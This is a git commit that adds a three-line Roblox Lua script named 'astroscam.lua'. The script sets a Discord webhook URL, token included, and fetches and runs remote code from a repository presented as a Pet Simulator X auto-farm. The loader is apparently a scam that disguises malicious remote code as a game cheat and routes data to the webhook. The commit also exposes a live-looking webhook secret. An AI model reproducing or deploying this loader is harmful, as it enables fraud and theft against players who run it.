aeeaf17a00a0488f95e4e35d2dedc88149b610fb
victordevrb <136542522+victordevrb@users.noreply.github.com>
2023-06-29 20:24:28 -0700

    Add files via upload

---
+++ astroscam.lua
@@ -0,0 +1,3 @@
+_G.UserID = 4758257776
+_G.WebHook = "https://discord.com/api/webhooks/1124177708545478726/e3zXB68WeY8eF_RUmudTjNNjuN_Sn5FnFhUfov7foyprpcVWfASZib3rf4peNzOj4PYR"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua",true))()
